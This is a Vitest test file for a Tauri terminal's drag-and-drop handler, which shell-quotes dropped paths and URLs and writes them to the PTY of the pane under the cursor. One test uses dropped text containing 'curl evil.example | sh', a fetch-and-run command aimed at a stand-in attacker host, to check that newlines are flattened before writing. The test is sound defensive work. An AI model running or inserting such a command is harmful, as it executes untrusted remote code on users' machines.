import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const ptyClient = vi.hoisted(() => ({
  ptyWrite: vi.fn<(id: string, data: string) => Promise<void>>().mockResolvedValue(undefined),
}));

type DragDropPayload =
  | { type: "enter"; position: { x: number; y: number }; paths: readonly string[] }
  | { type: "over"; position: { x: number; y: number }; paths: readonly string[] }
  | { type: "drop"; position: { x: number; y: number }; paths: readonly string[] }
  | { type: "leave" };

const webview = vi.hoisted(() => {
  let cb: ((event: { payload: DragDropPayload }) => void) | null = null;
  const unlisten = vi.fn();
  return {
    fire(payload: DragDropPayload): void {
      cb?.({ payload });
    },
    reset(): void {
      cb = null;
      unlisten.mockClear();
    },
    unlisten,
    onDragDropEvent(handler: (event: { payload: DragDropPayload }) => void): Promise<() => void> {
      cb = handler;
      return Promise.resolve(unlisten);
    },
  };
});

vi.mock("./pty-client", () => ptyClient);

vi.mock("@tauri-apps/api/webviewWindow", () => ({
  getCurrentWebviewWindow: () => ({
    onDragDropEvent: (handler: (event: { payload: DragDropPayload }) => void) =>
      webview.onDragDropEvent(handler),
  }),
}));

import { attachTerminalDrop, formatPathsForShell } from "./terminal-drop";

// jsdom 29 does not implement these on the Document prototype — vi.spyOn fails
// because the property is undefined. Install assignable stubs once per test
// and reset them in afterEach.
function setElementFromPoint(el: Element | null): void {
  Object.defineProperty(document, "elementFromPoint", {
    value: () => el,
    configurable: true,
    writable: true,
  });
}

interface FakeDataTransferEntries {
  uriList?: string;
  plain?: string;
}
function fakeDataTransfer(entries: FakeDataTransferEntries = {}): DataTransfer {
  const types: string[] = [];
  if (entries.uriList !== undefined) types.push("text/uri-list");
  if (entries.plain !== undefined) types.push("text/plain");
  return {
    types,
    getData(format: string): string {
      if (format === "text/uri-list") return entries.uriList ?? "";
      if (format === "text/plain" || format === "text") return entries.plain ?? "";
      return "";
    },
    setData() {},
    dropEffect: "none",
    effectAllowed: "all",
    files: [] as unknown as FileList,
    items: [] as unknown as DataTransferItemList,
  } as unknown as DataTransfer;
}

function makeGridWithPane(ptyId: string): { gridEl: HTMLElement; paneEl: HTMLElement } {
  const gridEl = document.createElement("div");
  gridEl.className = "grid";
  const paneEl = document.createElement("div");
  paneEl.className = "pane";
  paneEl.dataset.ptyId = ptyId;
  gridEl.append(paneEl);
  document.body.append(gridEl);
  return { gridEl, paneEl };
}

describe("formatPathsForShell", () => {
  it("returns empty string for no paths", () => {
    expect(formatPathsForShell([])).toBe("");
  });

  it("single-quotes a simple path with trailing space", () => {
    expect(formatPathsForShell(["/tmp/foo.txt"], "posix")).toBe("'/tmp/foo.txt' ");
  });

  it("escapes embedded single quotes", () => {
    expect(formatPathsForShell(["/x/it's.txt"], "posix")).toBe(`'/x/it'\\''s.txt' `);
  });

  it("space-separates multiple paths", () => {
    expect(formatPathsForShell(["/a b/c", "/d.txt"], "posix")).toBe("'/a b/c' '/d.txt' ");
  });

  it("double-quotes Windows paths for cmd-compatible insertion", () => {
    expect(
      formatPathsForShell(
        ["C:\\Program Files\\polakapi\\notes.txt", "D:\\src\\main.ts"],
        "windows",
      ),
    ).toBe('"C:\\Program Files\\polakapi\\notes.txt" "D:\\src\\main.ts" ');
  });

  it("prefers navigator.userAgentData when detecting the Windows shell platform", () => {
    const originalUserAgentData = Object.getOwnPropertyDescriptor(navigator, "userAgentData");
    Object.defineProperty(navigator, "userAgentData", {
      value: { platform: "Windows" },
      configurable: true,
    });
    try {
      expect(formatPathsForShell(["C:\\a b.txt"])).toBe('"C:\\a b.txt" ');
    } finally {
      if (originalUserAgentData) {
        Object.defineProperty(navigator, "userAgentData", originalUserAgentData);
      } else {
        Reflect.deleteProperty(navigator, "userAgentData");
      }
    }
  });

  it("falls back to navigator.userAgent when userAgentData is unavailable", () => {
    const originalUserAgent = navigator.userAgent;
    const originalUserAgentData = Object.getOwnPropertyDescriptor(navigator, "userAgentData");
    Object.defineProperty(navigator, "userAgentData", { value: undefined, configurable: true });
    Object.defineProperty(navigator, "userAgent", {
      value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      configurable: true,
    });
    try {
      expect(formatPathsForShell(["C:\\a b.txt"])).toBe('"C:\\a b.txt" ');
    } finally {
      if (originalUserAgentData) {
        Object.defineProperty(navigator, "userAgentData", originalUserAgentData);
      } else {
        Reflect.deleteProperty(navigator, "userAgentData");
      }
      Object.defineProperty(navigator, "userAgent", {
        value: originalUserAgent,
        configurable: true,
      });
    }
  });

  it("defaults to POSIX when navigator is unavailable", () => {
    vi.stubGlobal("navigator", undefined);
    try {
      expect(formatPathsForShell(["/tmp/a b.txt"])).toBe("'/tmp/a b.txt' ");
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

describe("attachTerminalDrop", () => {
  beforeEach(() => {
    ptyClient.ptyWrite.mockClear();
    webview.reset();
  });

  afterEach(() => {
    document.body.innerHTML = "";
  });

  it("ignores OS drops outside the active host", () => {
    const { gridEl, paneEl } = makeGridWithPane("pty-1");
    const router = { getActiveHost: (): HTMLElement | null => gridEl };
    const handle = attachTerminalDrop({ gridEl, router });

    // Point at an element that is NOT inside the active host.
    const outside = document.createElement("div");
    document.body.append(outside);
    setElementFromPoint(outside);

    webview.fire({ type: "drop", position: { x: 100, y: 100 }, paths: ["/foo"] });

    expect(ptyClient.ptyWrite).not.toHaveBeenCalled();
    expect(paneEl.classList.contains("pane-drop-target")).toBe(false);
    handle.detach();
  });

  it("writes shell-quoted paths to the PTY of the pane under the cursor", () => {
    const { gridEl, paneEl } = makeGridWithPane("pty-77");
    const router = { getActiveHost: (): HTMLElement | null => gridEl };
    const handle = attachTerminalDrop({ gridEl, router });

    setElementFromPoint(paneEl);

    webview.fire({ type: "drop", position: { x: 10, y: 20 }, paths: ["/a/b.txt"] });

    expect(ptyClient.ptyWrite).toHaveBeenCalledExactlyOnceWith("pty-77", "'/a/b.txt' ");
    handle.detach();
  });

  it("toggles .pane-drop-target on enter/leave", () => {
    const { gridEl, paneEl } = makeGridWithPane("pty-2");
    const router = { getActiveHost: (): HTMLElement | null => gridEl };
    const handle = attachTerminalDrop({ gridEl, router });

    setElementFromPoint(paneEl);

    webview.fire({ type: "enter", position: { x: 0, y: 0 }, paths: [] });
    expect(paneEl.classList.contains("pane-drop-target")).toBe(true);

    webview.fire({ type: "leave" });
    expect(paneEl.classList.contains("pane-drop-target")).toBe(false);

    handle.detach();
  });

  it("HTML5 drop of a URL writes it to the pane under the cursor", () => {
    const { gridEl, paneEl } = makeGridWithPane("pty-3");
    const router = { getActiveHost: (): HTMLElement | null => gridEl };
    const handle = attachTerminalDrop({ gridEl, router });

    const dt = fakeDataTransfer({
      uriList: "https://example.com/x\r\n# comment\r\nhttps://example.com/y",
    });

    const drop = new Event("drop", { bubbles: true, cancelable: true });
    Object.defineProperty(drop, "dataTransfer", { value: dt });
    Object.defineProperty(drop, "target", { value: paneEl, configurable: true });

    paneEl.dispatchEvent(drop);

    expect(ptyClient.ptyWrite).toHaveBeenCalledExactlyOnceWith(
      "pty-3",
      "https://example.com/x https://example.com/y ",
    );
    handle.detach();
  });

  it("HTML5 drop of plain text flattens newlines before writing", () => {
    const { gridEl, paneEl } = makeGridWithPane("pty-5");
    const router = { getActiveHost: (): HTMLElement | null => gridEl };
    const handle = attachTerminalDrop({ gridEl, router });

    const dt = fakeDataTransfer({
      plain: "ls\ncurl evil.example | sh\n",
    });

    const drop = new Event("drop", { bubbles: true, cancelable: true });
    Object.defineProperty(drop, "dataTransfer", { value: dt });
    Object.defineProperty(drop, "target", { value: paneEl, configurable: true });

    paneEl.dispatchEvent(drop);

    expect(ptyClient.ptyWrite).toHaveBeenCalledExactlyOnceWith(
      "pty-5",
      "ls curl evil.example | sh ",
    );
    handle.detach();
  });

  it("detach removes listeners and clears highlight", () => {
    const { gridEl, paneEl } = makeGridWithPane("pty-4");
    const router = { getActiveHost: (): HTMLElement | null => gridEl };
    const handle = attachTerminalDrop({ gridEl, router });

    setElementFromPoint(paneEl);
    webview.fire({ type: "enter", position: { x: 0, y: 0 }, paths: [] });
    expect(paneEl.classList.contains("pane-drop-target")).toBe(true);

    handle.detach();
    expect(paneEl.classList.contains("pane-drop-target")).toBe(false);

    // Further events after detach are ignored.
    webview.fire({ type: "drop", position: { x: 0, y: 0 }, paths: ["/foo"] });
    expect(ptyClient.ptyWrite).not.toHaveBeenCalled();
  });
});
